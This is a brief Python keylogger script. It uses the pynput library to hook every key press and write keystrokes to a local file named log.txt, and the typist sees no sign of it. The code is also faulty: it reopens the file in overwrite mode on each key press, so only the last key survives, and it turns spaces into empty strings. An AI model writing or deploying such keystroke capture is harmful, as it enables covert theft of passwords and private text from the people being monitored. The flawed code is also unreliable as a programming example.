from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")

    if keydata == "Key.space":
        keydata = ""
    elif keydata == "Key.enter":
        keydata = "\n"
    

    with open("log.txt", 'w') as file1:
        file1.write(keydata)

with Listener(on_press=writetofile) as i:
    i.join()